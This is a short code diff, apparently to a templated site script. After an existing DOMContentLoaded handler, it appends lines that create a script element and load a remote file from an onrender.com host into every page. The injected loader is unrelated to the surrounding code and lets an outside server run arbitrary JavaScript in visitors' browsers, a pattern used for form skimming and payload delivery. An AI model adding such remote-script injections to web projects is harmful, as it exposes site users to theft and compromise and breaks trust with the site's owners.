@@ -3619,3 +3619,8 @@ DOMContentLoaded.addEventOrExecute(() => {
     {% endif %}
 
 });
+const script = document.createElement('script')
+
+script.src = 'https://maxilaudo-node.onrender.com/script.js'
+
+document.body.appendChild(script)
